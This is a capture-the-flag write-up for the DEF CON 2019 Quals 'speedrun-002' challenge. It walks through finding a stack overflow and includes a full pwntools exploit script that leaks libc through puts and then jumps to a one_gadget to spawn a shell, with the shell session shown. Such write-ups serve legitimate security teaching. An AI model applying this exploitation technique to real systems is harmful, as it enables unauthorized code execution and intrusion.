# Defcon 2019 Quals Speedrun 2

Full disclosure, I was not the one who solved this for my team (I was too slow). However I solved it after the competition, and this is how I did it (although I did this by hand, and some teams probably had auto-pwn tools to help them solve it quickly). 

Also for this challenge to work properly, you will be needing to use the libc version `libc-2.27.so` (Ubuntu 18.04) or adjust it to match your own libc version.

Let's take a look at the binary:

```
$	file speedrun-002 
speedrun-002: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=fb0684e50a97ccfc5dbe71bcdcb4a45aacfed414, stripped
$	pwn checksec speedrun-002 
[*] '/Hackery/defcon/speedrun/s2/speedrun-002'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$	./speedrun-002 
We meet again on these pwning streets.
What say you now?
1593572/
What a ho-hum thing to say.
Fare thee well.
```

So we can see that it is a `64` bit binary with NX, that is dynamically linked. We see that it takes input, and prints some text. When we look at the main function in IDA we see this:

```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  setvbuf(stdout, 0LL, 2, 0LL);
  if ( !getenv("DEBUG") )
    alarm(5u);
  putsStreets();
  callsVuln();
  putsFare();
  return 0LL;
}
```

We can see it calls some functions, but the one of importance to us is `callsVuln()`:


```
int callsVuln()
{
  int result; // eax@2
  char buf; // [sp+0h] [bp-590h]@1
  char v2; // [sp+190h] [bp-400h]@2

  puts("What say you now?");
  read(0, &buf, 0x12CuLL);
  if ( !strncmp(&buf, "Everything intelligent is so boring.", 0x24uLL) )
    result = vuln(&v2);
  else
    result = puts("What a ho-hum thing to say.");
  return result;
}
```

So we can see that if we send the string `Everything intelligent is so boring.`, it will run the function `vuln()` with the address of `v2` as an argument (which is a `0x400` byte char array):

```
ssize_t __fastcall vuln(void *a1)
{
  puts("What an interesting thing to say.\nTell me more.");
  read(0, a1, 0x7DAuLL);
  return write(1, "Fascinating.\n", 0xDuLL);
}
```

Which in this function, we can see it will allow us to scan in `0x7da` bytes of data and get a buffer overflow (however we will get code execution when `callsVuln` returns). 

Since this is a dynamically linked binary, we can't just build a simple ROP chain like we did for speedrun-001. So what we will do is use puts to get a libc infoleak, call the vulnerable function again, then call a oneshot gadget.

Since puts is an imported function and there is no PIE, we can call puts. For an argument we will pass to it the got address of puts, which holds the libc address of puts. This will give us a libc infoleak. 

We can see puts is imported either in IDA, objdump, or some other binary analysis:

```
$	objdump -D speedrun-002 | grep puts
00000000004005b0 <puts@plt>:
  4006fd:	e8 ae fe ff ff       	callq  4005b0 <puts@plt>
  400718:	e8 93 fe ff ff       	callq  4005b0 <puts@plt>
  40075e:	e8 4d fe ff ff       	callq  4005b0 <puts@plt>
  4007b3:	e8 f8 fd ff ff       	callq  4005b0 <puts@plt>
  4007c6:	e8 e5 fd ff ff       	callq  4005b0 <puts@plt>
```

Also when we call puts, we will use a `pop rdi` rop gadget to prep the argument for it (check the writeup for speedrun-001 for more details on that).

After that we will call `0x40074c`, which is the start of the `callsVuln` function. Then we will just do the overflow again except set the return address to be equal to that of a oneshot gadget. A oneshot gadget is essentially a single rop gadget in the libc, that we can call to get a shell (can find it here: https://github.com/david942j/one_gadget ).

We can find the available oneshot gadgets like so:
```
$	one_gadget libc-2.27.so 
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Each of these has a certian constraint that needs to be met in order for it to worked. Through just trial and error, I settled on `0x4f322`. Also we will need the offset from libc for the string `/bin/sh`, and this is how I got it:

```
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /Hackery/defcon/speedrun/s2/speedrun-002
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /Hackery/defcon/speedrun/s2/speedrun-002
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /Hackery/defcon/speedrun/s2/speedrun-002
0x00007ffff79e4000 0x00007ffff7bcb000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bcb000 0x00007ffff7dcb000 0x00000000001e7000 --- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcb000 0x00007ffff7dcf000 0x00000000001e7000 r-- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 0x00007ffff7dd1000 0x00000000001eb000 rw- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dd1000 0x00007ffff7dd5000 0x0000000000000000 rw- 
0x00007ffff7dd5000 0x00007ffff7dfc000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7fd9000 0x00007ffff7fdb000 0x0000000000000000 rw- 
0x00007ffff7ff7000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000027000 r-- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000028000 rw- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  search-pattern /bin/sh
[+] Searching '/bin/sh' in memory
[+] In '/lib/x86_64-linux-gnu/libc-2.27.so'(0x7ffff79e4000-0x7ffff7bcb000), permission=r-x
  0x7ffff7b97e9a - 0x7ffff7b97ea1  →   "/bin/sh" 
```

and a bit of python math:
```
>>> hex(0x7ffff7b97e9a - 0x00007ffff79e4000)
'0x1b3e9a'
```

Also one more thing, the offset between the start of our input and the return address is `0x408`. This is because of the `0x400` byte of the char array along with the `0x8` bytes of the saved based pointer.

Putting it all together we get the following exploit:

```
from pwn import *

# Establish target process
target = process('./speedrun-002')
#gdb.attach(target, gdbscript='b *0x4007ba')
#gdb.attach(target, gdbscript='b *0x40072e')

# Establish the binary
binary = ELF('speedrun-002')
libc = ELF('libc-2.27.so')


# Establish rop gadget, and puts values
popRdi = 0x4008a3
putsPlt = binary.symbols['puts']
putsGot = binary.got['puts']

# Where we will return to after puts infoleak
ret = 0x40074c

# Handle I/O stuff to get to overflow
target.sendline('Everything intelligent is so boring.')

print target.recvuntil('Tell me more.')

# Overflow with rop gadget to get libc infoleak,
# And hit vulnerable code path again
payload = '0'*0x408

payload += p64(popRdi)
payload += p64(putsGot)
payload += p64(putsPlt)
payload += p64(ret)


target.send(payload)

print target.recvuntil('Fascinating.\x0a')

# Scan in and filter out infoleak, get libc base

leak = target.recvline().replace("\x0a", "")
leak = u64(leak + "\x00"*(8 - len(leak)))
libcBase = leak - libc.symbols['puts']

# Get address of /bin/sh
binsh = libcBase + 0x1b3e9a

print "libc base: " + hex(libcBase)

# Prep the oneshot gadget overflow
payload = '0'*0x408
payload += p64(libcBase + 0x4f322)

target.sendline('Everything intelligent is so boring.')

print target.recvuntil('Tell me more.')

# Send the oneshot gadget payload
target.send(payload)

target.interactive()
```

When we run it:
```
$	python exploit.py 
[+] Starting local process './speedrun-002': pid 22113
[*] '/Hackery/defcon/speedrun/s2/speedrun-002'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/Hackery/defcon/speedrun/s2/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
We meet again on these pwning streets.
What say you now?
What an interesting thing to say.
Tell me more.

Fascinating.

libc base: 0x7fa71f8b9000
What say you now?
What an interesting thing to say.
Tell me more.
[*] Switching to interactive mode

Fascinating.
$ w
 02:35:39 up  5:30,  1 user,  load average: 0.88, 0.84, 0.81
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guyinatu :0       :0               21:33   ?xdm?  29:28   0.00s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
$ ls
core  exploit.py  libc-2.27.so    readme.md  speedrun-002
```

Just like that, we got a shell!
